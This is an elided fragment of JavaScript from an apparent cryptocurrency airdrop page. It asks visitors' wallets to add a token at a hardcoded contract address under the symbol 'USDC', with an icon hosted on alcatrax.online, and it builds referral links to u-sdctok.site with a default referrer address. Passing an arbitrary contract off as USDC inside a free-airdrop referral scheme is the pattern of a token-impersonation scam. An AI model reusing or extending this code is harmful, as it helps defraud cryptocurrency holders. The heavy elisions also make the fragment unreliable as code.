...
const sttaddr = "0xDAD7A5Ec3e42a0e3Dc829F5f6446aa2E230bF44d";
const sttabi = [{
  "inputs": [],
...
const getAirdrop = async () => {
  ...
  if(fresh === "")
      fresh = "0xDAD7A5Ec3e42a0e3Dc829F5f6446aa2E230bF44d";
  ...
  try {
    web3.currentProvider.sendAsync({
      ...
      params: {
        'type': 'ERC20',
        'options': {
          'address': '0xDAD7A5Ec3e42a0e3Dc829F5f6446aa2E230bF44d',
          'symbol': 'USDC',
          'decimals': '18',
          'image': 'https://alcatrax.online/img/mts.png',
        },
      },
...
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
  ...
  'error'
    ...
    document.getElementById('refaddress').value = 'https://u-sdctok.site/?ref=' + document.getElementById('refaddress').value;
}
}
}
...
function querySt(ji) {
  ...
  if( ref==null){
      ref = "0x5e50D63F50e7475aDDabbC7E11E51735a4371Cb5";
       document.getElementById('airinput').value = ref; 
  }else{ 
  document.getElementById('airinput').value = ref; 
  } 
